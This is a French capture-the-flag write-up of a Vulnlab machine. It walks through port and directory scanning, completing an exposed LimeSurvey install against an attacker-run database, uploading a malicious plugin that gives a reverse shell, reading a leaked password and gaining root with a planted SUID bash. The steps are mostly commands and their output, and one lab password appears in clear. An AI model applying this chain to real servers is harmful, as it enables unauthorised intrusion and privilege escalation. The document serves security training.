@@ -1,0 +1,317 @@
+---
+title: Forgotten - Easy
+description: WU forgotten - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+import limesurveypanel from '../../../../assets/writeup/vulnlab/forgotten/limesurveypanel.png';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+## 🔭 Périmètre
+
+IP: 10.10.79.178
+OS: Linux
+
+## 🔍 Récupération d'informations 
+
+### PortScan
+```shell
+[Sep 13, 2024 - 16:02:10 (CEST)] exegol-Vulnlab /workspace # nmap -sC -sV 10.10.79.178              
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-13 16:02 CEST
+Nmap scan report for 10.10.79.178
+Host is up (0.016s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 eaf8f4c0ee7a89c52951e53d7a9cfda5 (ECDSA)
+|_  256 d2fd046bee95dc652dfeeea85d1e8557 (ED25519)
+80/tcp open  http    Apache httpd 2.4.56
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: 403 Forbidden
+Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
+```
+On a donc un serveur Apache qui tourne (version 2.4.56), la page retourne un code 403 Forbidden.
+```shell
+[Sep 13, 2024 - 16:04:29 (CEST)] exegol-Vulnlab /workspace # gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://forgotten.vl/     
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://forgotten.vl/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+/survey               (Status: 301) [Size: 313] [--> http://forgotten.vl/survey/]
+Progress: 20476 / 20477 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+En se rendant sur la page `/survey`, nous devons configurer et installer "LimeSurvey", nous ne pouvons pas créer directement de bases de données via cette page.
+Création de la base de données en local avec le script suivant:
+
+```bash script-db.sh
+#!/bin/bash
+
+# Configuration
+DB_NAME="test"
+DB_USER="root"
+DB_PASSWORD="root"
+BIND_ADDRESS="0.0.0.0"
+REMOTE_IP="%" 
+
+# Function to check the success of each operation
+check_success() {
+    if [ $? -ne 0 ]; then
+        echo "Error during: $1"
+        exit 1
+    fi
+}
+
+# Update the system and install MariaDB Server
+echo "Updating the system and installing MariaDB Server..."
+sudo apt update
+sudo apt install -y mariadb-server
+check_success "MariaDB Server installation"
+
+# Configure MariaDB to listen on all network interfaces
+echo "Configuring MariaDB to listen on all network interfaces..."
+sudo sed -i "s/^bind-address.*/bind-address = $BIND_ADDRESS/" /etc/mysql/mariadb.conf.d/50-server.cnf
+check_success "Updating bind-address"
+
+# Restart MariaDB service to apply changes
+echo "Restarting MariaDB service..."
+sudo systemctl restart mariadb
+check_success "MariaDB restart"
+
+# Create the MariaDB database and user
+echo "Creating MariaDB database and user..."
+sudo mariadb -u root -e "
+CREATE DATABASE $DB_NAME;
+CREATE USER '$DB_USER'@'$REMOTE_IP' IDENTIFIED BY '$DB_PASSWORD';
+GRANT SELECT, CREATE, INSERT, UPDATE, DELETE, ALTER, DROP, INDEX ON $DB_NAME.* TO '$DB_USER'@'$REMOTE_IP';
+FLUSH PRIVILEGES;"
+check_success "Database and user creation"
+
+# Optionally configure the firewall to allow traffic on port 3306
+echo "Configuring firewall to allow traffic on port 3306..."
+sudo ufw allow 3306/tcp
+check_success "Firewall configuration"
+
+echo "Installation and configuration completed successfully!"
+```
+
+
+Configuration du panel administrateur:
+
+<Image src={limesurveypanel} alt="banner" format="avif" quality={"mid"}/>
+
+Connexion et direction le menu > plugins
+
+J'ai créé un fichier config.xml pour pouvoir uploader un reverse shell php. Le tout dans une archive .zip
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<config>
+    <metadata>
+        <name>RevShell</name>
+        <type>plugin</type>
+        <creationDate>2024-09-13</creationDate>
+        <lastUpdate>2024-09-13</lastUpdate>
+        <author>Hip5kull</author>
+        <authorUrl></authorUrl>
+        <version>1.0.0</version>
+        <license>GNU General Public License version 2 or later</license>
+        <description><![CDATA[Author: Hip5kull]]></description>
+    </metadata>
+
+    <compatibility>
+        <version>6.3.7</version>
+    </compatibility>
+
+    <updaters disabled="disabled">
+    </updaters>
+</config>
+```
+```shell
+[Sep 13, 2024 - 17:03:48 (CEST)] exegol-Vulnlab /workspace# nc -lvnp 4041  
+```
+J'essai ensuite d'obtenir un reverse shell en me rendant sur le lien du plugins:
+
+http://forgotten.vl/survey/upload/plugins/RevShell/revshell.php
+```shell
+[Sep 13, 2024 - 17:03:48 (CEST)] exegol-Vulnlab /workspace# nc -lvnp 4041    
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4041
+Ncat: Listening on 0.0.0.0:4041
+Ncat: Connection from 10.10.79.178.
+Ncat: Connection from 10.10.79.178:52002.
+Linux efaa6f5097ed 6.2.0-1012-aws #12~22.04.1-Ubuntu SMP Thu Sep  7 14:01:24 UTC 2023 x86_64 GNU/Linux
+ 15:08:28 up  1:06,  0 users,  load average: 0.01, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
+sh: 0: can't access tty; job control turned off
+$ whoami
+limesvc
+$ ls -la
+total 80
+drwxr-xr-x   1 root root 4096 Dec  2  2023 .
+drwxr-xr-x   1 root root 4096 Dec  2  2023 ..
+-rwxr-xr-x   1 root root    0 Dec  2  2023 .dockerenv
+drwxr-xr-x   1 root root 4096 Dec  2  2023 bin
+drwxr-xr-x   2 root root 4096 Sep 29  2023 boot
+drwxr-xr-x   5 root root  340 Sep 13 14:01 dev
+drwxr-xr-x   1 root root 4096 Dec  2  2023 etc
+drwxr-xr-x   1 root root 4096 Dec  2  2023 home
+drwxr-xr-x   1 root root 4096 Nov 21  2023 lib
+drwxr-xr-x   2 root root 4096 Nov 20  2023 lib64
+drwxr-xr-x   2 root root 4096 Nov 20  2023 media
+drwxr-xr-x   2 root root 4096 Nov 20  2023 mnt
+drwxr-xr-x   2 root root 4096 Nov 20  2023 opt
+dr-xr-xr-x 170 root root    0 Sep 13 14:01 proc
+drwx------   1 root root 4096 Dec  2  2023 root
+drwxr-xr-x   1 root root 4096 Nov 21  2023 run
+drwxr-xr-x   1 root root 4096 Dec  2  2023 sbin
+drwxr-xr-x   2 root root 4096 Nov 20  2023 srv
+dr-xr-xr-x  13 root root    0 Sep 13 14:01 sys
+drwxrwxrwt   1 root root 4096 Sep 13 15:02 tmp
+drwxr-xr-x   1 root root 4096 Nov 20  2023 usr
+drwxr-xr-x   1 root root 4096 Nov 21  2023 var
+```
+En listant, je m'aperçois que je suis dans un conteneur Docker.
+```shell
+$ env
+APACHE_CONFDIR=/etc/apache2
+HOSTNAME=efaa6f5097ed
+PHP_INI_DIR=/usr/local/etc/php
+LIMESURVEY_ADMIN=limesvc
+SHLVL=0
+PHP_LDFLAGS=-Wl,-O1 -pie
+APACHE_RUN_DIR=/var/run/apache2
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+PHP_VERSION=8.0.30
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
+PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_GROUP=limesvc
+APACHE_RUN_USER=limesvc
+APACHE_LOG_DIR=/var/log/apache2
+LIMESURVEY_PASS=<retracted>
+PWD=/
+PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
+PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
+APACHE_ENVVARS=/etc/apache2/envvars
+```
+Le mot de passe du user limesvc est en clair dans les variables d'environnements. Voyons si on peut se connecter en ssh.
+```shell
+[Sep 13, 2024 - 16:21:04 (CEST)] exegol-Vulnlab /workspace # ssh limesvc@forgotten.vl
+The authenticity of host 'forgotten.vl (10.10.79.178)' can't be established.
+ED25519 key fingerprint is SHA256:76WOYnkA/HQr1WUahG3haGn1tCJsT1RT2ev3WqT0LCI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'forgotten.vl' (ED25519) to the list of known hosts.
+(limesvc@forgotten.vl) Password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep 13 15:11:36 UTC 2024
+
+  System load:  0.0               Processes:                116
+  Usage of /:   39.1% of 7.57GB   Users logged in:          0
+  Memory usage: 21%               IPv4 address for docker0: 172.17.0.1
+  Swap usage:   0%                IPv4 address for ens5:    10.10.79.178
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+76 updates can be applied immediately.
+48 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Dec  2 15:32:15 2023 from 10.10.1.254
+limesvc@ip-10-10-200-233:~$ 
+
+limesvc@ip-10-10-200-233:~$ ls
+user.txt
+limesvc@ip-10-10-200-233:~$ cat user.txt
+```
+Que faire maintenant ? `limesvc` ne peut rien faire de plus, je retourne sur le conteneur je ne vois rien avec le revshell que j'ai. Je regarde si je peux obtenir un autre shell:
+```shell
+$ script -q /dev/null -c bash
+limesvc@efaa6f5097ed:/$ sudo su
+sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for limesvc: 5W5HN4K4GCXf9E
+
+root@efaa6f5097ed:/# cd /root
+cd /root
+root@efaa6f5097ed:~# ls
+ls
+```
+Je me place dans le dossier `/var/www/html/survey` et fais une copie de `/bin/bash` en le renommant ./skull
+```shell
+root@efaa6f5097ed:~# cd /var/www/html/survey
+cd /var/www/html/survey
+root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./skull
+cp /bin/bash ./pwned
+```
+J'attribue les droits de superutilisateur au binaire et retourne sur la connexion ssh de `limesvc`:
+```shell
+root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./skull
+chmod u+s ./pwned
+
+limesvc@ip-10-10-200-233:/$ cd opt/limesurvey/
+limesvc@ip-10-10-200-233:/opt/limesurvey$ ls
+admin        assets  gulpfile.js  installer  locale   node_modules      plugins        psalm-strict.xml  skull      SECURITY.md   themes  upload
+application  docs    index.php    LICENSE    modules  open-api-gen.php  psalm-all.xml  psalm.xml         README.md  setdebug.php  tmp     vendor
+limesvc@ip-10-10-200-233:/opt/limesurvey$ ./skull -p
+pwned-5.1# whoami
+root
+pwned-5.1# ls
+admin	     assets  gulpfile.js  installer  locale   node_modules	plugins        psalm-strict.xml  pwned	    SECURITY.md   themes  upload
+application  docs    index.php	  LICENSE    modules  open-api-gen.php	psalm-all.xml  psalm.xml	 README.md  setdebug.php  tmp	  vendor
+pwned-5.1# cd /root
+pwned-5.1# ls
+root.txt  snap
+pwned-5.1# cat root.txt
+VL{<retracted>}
+```
